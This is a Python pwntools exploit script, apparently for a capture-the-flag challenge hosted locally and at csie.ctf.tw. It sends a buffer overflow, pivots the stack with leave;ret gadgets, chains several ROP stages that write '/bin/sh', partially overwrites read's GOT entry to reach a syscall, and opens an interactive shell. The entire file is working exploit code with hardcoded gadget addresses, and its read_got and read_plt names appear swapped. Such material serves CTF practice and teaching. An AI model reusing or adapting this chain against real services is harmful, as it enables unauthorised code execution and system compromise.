import time

from pwn import *

context.arch = 'amd64'

host = '127.0.0.1'
port = 8888
# host = 'csie.ctf.tw'
# port = 10135

r = remote(host, port)

input('Press enter to continue.')

payload = b'a'*0x20

rbp_20_read_leave_ret = 0x000000000040062b
buf1 = 0x00602000 - 0x200
buf2 = buf1 + 0x100
read_got = 0x4004c0
read_plt = 0x601020
pop_rsi_r15 = 0x00000000004006b1
leave_ret = 0x0000000000400646
pop_rbx_rbp_r12_r13_r14_r15 = 0x4006aa
mov_rdx_r13_rsi_r14_edi_r15d_call_QWORD_r12_rbx_8 = 0x400690

rop = flat([buf1+0x20, rbp_20_read_leave_ret])
r.recvuntil(':')
r.send(payload + rop)

# now rax=0, rdi=0x0, rsi=0x601048, rdx=0x40
rop = flat([pop_rsi_r15, read_plt, '/bin/sh\0', read_got, buf1+0x40+0x20, rbp_20_read_leave_ret])
r.send(rop)

rop = flat([0xdeadbeaf, 0xdeadbeaf, 0xdeadbeaf, 0xdeadbeaf, buf1+0x20+0x20, rbp_20_read_leave_ret])
r.send(rop)

rop = flat([leave_ret, 0xdeadbeaf, 0xdeadbeaf, 0xdeadbeaf, buf1-0x8, rbp_20_read_leave_ret])
r.send(rop)

r.send(p64(read_got))
# r.sendline(b'')

input('Press enter to continue.')

r.send(b'\x2e')

r.interactive()
